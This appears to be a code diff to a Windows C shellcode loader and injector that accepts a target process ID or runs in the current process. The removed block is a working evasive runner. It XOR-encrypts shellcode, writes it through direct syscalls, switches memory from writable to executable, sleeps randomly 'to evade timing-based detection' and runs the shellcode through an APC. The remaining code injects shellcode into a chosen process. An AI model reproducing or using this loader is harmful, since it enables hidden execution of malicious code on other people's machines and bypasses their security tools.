@@ -190,121 +190,11 @@ void InjectShellcode(DWORD pid, unsigned char* shellcode, size_t shellcode_len) 
 
 }
 
-EXTERN_C NTSTATUS Sw3NtQueueApcThread(
-    IN HANDLE ThreadHandle,
-    IN PKNORMAL_ROUTINE ApcRoutine,
-    IN PVOID ApcArgument1 OPTIONAL,
-    IN PVOID ApcArgument2 OPTIONAL,
-    IN PVOID ApcArgument3 OPTIONAL
-);
 void xor_encrypt_decrypt(unsigned char* data, size_t len, unsigned char key) {
     for (size_t i = 0; i < len; i++) {
         data[i] ^= key;
     }
 }
-
-void run_shellcode_local(unsigned char *shellcode, size_t shellcode_len) {
-    printf("Running shellcode locally\n");
-    srand((unsigned)time(NULL));
-
-    PVOID baseAddress = NULL;
-    SIZE_T regionSize = shellcode_len;
-    HANDLE processHandle = GetCurrentProcess();
-    ULONG allocationType = MEM_COMMIT | MEM_RESERVE;
-    ULONG protectWritable = PAGE_READWRITE;
-    ULONG protectExecuteRead = PAGE_EXECUTE_READ;
-    NTSTATUS status;
-
-    // Choose a random key for XOR encryption
-    unsigned char xorKey = (unsigned char)(rand() % 256);
-
-    // Make a copy of shellcode and encrypt it before writing to memory
-    unsigned char* encryptedShellcode = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, shellcode_len);
-    if (!encryptedShellcode) {
-        return;
-    }
-    memcpy(encryptedShellcode, shellcode, shellcode_len);
-    xor_encrypt_decrypt(encryptedShellcode, shellcode_len, xorKey);
-
-    // Step 1: Allocate memory with randomized base address
-    baseAddress = (PVOID)((rand() % 0x10000) * 0x10000); // Randomize base address
-    status = Sw3NtAllocateVirtualMemory(processHandle, &baseAddress, 0, &regionSize, allocationType, protectWritable);
-    if (status != 0) {
-        HeapFree(GetProcessHeap(), 0, encryptedShellcode);
-        return;
-    }
-
-    SIZE_T bytesWritten = 0;
-
-    // Step 2: Write encrypted shellcode into memory in chunks
-    size_t chunkSize = 64; // Write in smaller chunks
-    for (size_t offset = 0; offset < shellcode_len; offset += chunkSize) {
-        size_t toWrite = (offset + chunkSize > shellcode_len) ? shellcode_len - offset : chunkSize;
-        status = Sw3NtWriteVirtualMemory(processHandle, (PVOID)((char *)baseAddress + offset), 
-                                         encryptedShellcode + offset, toWrite, &bytesWritten);
-        if (status != 0 || bytesWritten != toWrite) {
-            ULONG freeType = MEM_RELEASE;
-            Sw3NtFreeVirtualMemory(processHandle, &baseAddress, &regionSize, freeType);
-            HeapFree(GetProcessHeap(), 0, encryptedShellcode);
-            return;
-        }
-    }
-
-    // Free the encrypted buffer from our heap, not needed anymore
-    HeapFree(GetProcessHeap(), 0, encryptedShellcode);
-
-    // Step 3: Decrypt the shellcode in-place inside the allocated memory
-    // Map a temporary buffer to read the encrypted memory, decrypt it, and write back.
-    // But since we have write access, we can decrypt directly in-place:
-    {
-        // We can read the memory we just wrote back into a local buffer, decrypt, and write again.
-        // Or directly decrypt in place if we trust our write functions. Since we have direct access,
-        // we can cast and decrypt directly. (Be cautious; normally you'd read it back.)
-        
-        unsigned char* localMap = (unsigned char*)baseAddress; // We assume direct access, safe in same process.
-        xor_encrypt_decrypt(localMap, shellcode_len, xorKey); // Decrypt in memory
-    }
-
-    // Step 4: Change memory protection to executable (no RWX, just R->X)
-    ULONG oldProtect;
-    status = Sw3NtProtectVirtualMemory(processHandle, &baseAddress, &regionSize, protectExecuteRead, &oldProtect);
-    if (status != 0) {
-        ULONG freeType = MEM_RELEASE;
-        Sw3NtFreeVirtualMemory(processHandle, &baseAddress, &regionSize, freeType);
-        return;
-    }
-
-    // Step 5: Sleep for a random duration to evade timing-based detection
-    LARGE_INTEGER delayInterval;
-    delayInterval.QuadPart = -(rand() % 10000000); // Random delay between 0-1 second
-    Sw3NtDelayExecution(FALSE, &delayInterval);
-
-    // Step 6: Instead of creating a new thread, queue an APC in the current thread.
-    HANDLE currentThreadHandle = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
-    if (!currentThreadHandle) {
-        ULONG freeType = MEM_RELEASE;
-        Sw3NtFreeVirtualMemory(processHandle, &baseAddress, &regionSize, freeType);
-        return;
-    }
-
-    status = Sw3NtQueueApcThread(currentThreadHandle, (PKNORMAL_ROUTINE)baseAddress, NULL, NULL, NULL);
-    CloseHandle(currentThreadHandle);
-    if (status != 0) {
-        ULONG freeType = MEM_RELEASE;
-        Sw3NtFreeVirtualMemory(processHandle, &baseAddress, &regionSize, freeType);
-        return;
-    }
-
-    // Step 7: Trigger an alertable wait so that the APC is invoked.
-    SleepEx(1000, TRUE);
-
-    // If the shellcode returns execution here:
-    // Step 8: Overwrite memory before freeing
-    SecureZeroMemory(baseAddress, shellcode_len);
-    ULONG freeType = MEM_RELEASE;
-    Sw3NtFreeVirtualMemory(processHandle, &baseAddress, &regionSize, freeType);
-}
-
 
 unsigned char* convert_shellcode(const char *shellcode, size_t *binary_length) {
     *binary_length = 0;
@@ -396,19 +286,6 @@ HANDLE OpenTargetProcess(DWORD pid) {
     return hProcess;
 }
 
-DWORD get_pid() {
-    PVOID peb;
-#if defined(_WIN64)
-    // For 64-bit systems
-    peb = (PVOID)__readgsqword(0x60); // Access the PEB base address
-#else
-    // For 32-bit systems
-    peb = (PVOID)__readfsdword(0x30);
-#endif
-    // Offset 0x20 in the PEB points to the Process ID
-    return *(DWORD *)((BYTE *)peb + 0x20);
-}
-
 //int main(int argc, char *argv[]) {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     AllocConsole();
@@ -447,8 +324,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 
     if (wcscmp(argv[1], L"L$ L") == 0) {
-        DWORD pid = get_pid();
-        run_shellcode_local(shellcode_binary, shellcode_binary_length);
+        DWORD pid = GetCurrentProcessId();
+        InjectShellcode(pid, shellcode_binary, shellcode_binary_length);
     } else {
         DWORD pid = wcstoul(argv[1], NULL, 10);
         if (pid == 0) {
